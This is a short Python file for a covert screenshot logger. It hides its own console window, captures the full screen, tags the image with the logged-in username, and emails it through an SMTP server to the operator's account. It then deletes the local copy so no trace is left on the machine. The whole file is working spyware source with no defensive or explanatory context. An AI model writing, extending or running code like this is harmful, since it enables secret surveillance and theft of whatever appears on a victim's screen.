import os
import smtplib
import getpass
import win32gui, win32console
from PIL import ImageGrab
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


class Screenshot:

    def __init__(self, interval, smtp_addr):

        self.interval = interval
        self.smtp_addr = smtp_addr
        self.user = getpass.getuser()

    def get_screenshot(self):

        self.screenshot = ImageGrab.grab()
        self.screenshot.save("screenshot.png")

    def send_by_mail(self, user, password):

        self.serveur = smtplib.SMTP(host=f"{self.smtp_addr}", port=587)
        self.serveur.starttls()
        self.serveur.login(user, password)
        self.msg = MIMEMultipart()
        self.msg['Subject'] = f"Screenshot from {self.user}"
        self.msg['From'] = user
        self.msg['To'] = user

        with open("screenshot.png", "rb") as file:

            self.img = MIMEImage(file.read())
            self.img.add_header('Content-Disposition', 'attachment', filename="screenshot.png")
            self.msg.attach(self.img)

        self.serveur.sendmail(user, user, self.msg.as_string())
        self.serveur.quit()
        os.remove("screenshot.png")
